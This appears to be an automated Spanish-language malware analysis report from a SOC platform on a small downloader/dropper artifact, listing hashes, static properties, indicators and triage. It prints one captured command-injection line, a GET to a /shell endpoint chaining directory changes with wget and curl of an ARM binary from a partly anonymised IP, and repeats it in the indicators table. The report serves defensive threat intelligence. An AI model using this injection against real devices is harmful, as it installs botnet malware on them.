# 🧬 Payload Analysis

`cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:56:46+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f`
- **SHA1:** `490f67509d812259655c0e847df1d61c6953ef81`
- **MD5:** `563fd00bcd1895f4e2704ea63f79c6b8`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 488 B |
| Entropía | 5.39 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd/tmp||cd/var/run||cd/mnt||cd/root||cd/; wget hxxp://94.154.43.XXX/nz/nz.arm7; curl -O hxxp://94.154.43.XXX/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.169.XXX | static_analysis |
| ip | 94.154.43.XXX | static_analysis |
| url | hxxp://94.154.43.XXX/nz/nz.arm7; | strings |
| hash | cf3fe5d2b21fb326de5d4b3561d6fdfe5073dba64c24a95c30a26b691c93dd8f | static_analysis |
| command | GET /shell?cd/tmp\|\|cd/var/run\|\|cd/mnt\|\|cd/root\|\|cd/; wget hxxp://94.154.43.XXX/nz/nz.arm7; curl -O hxxp://94.154.43.XXX/ | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
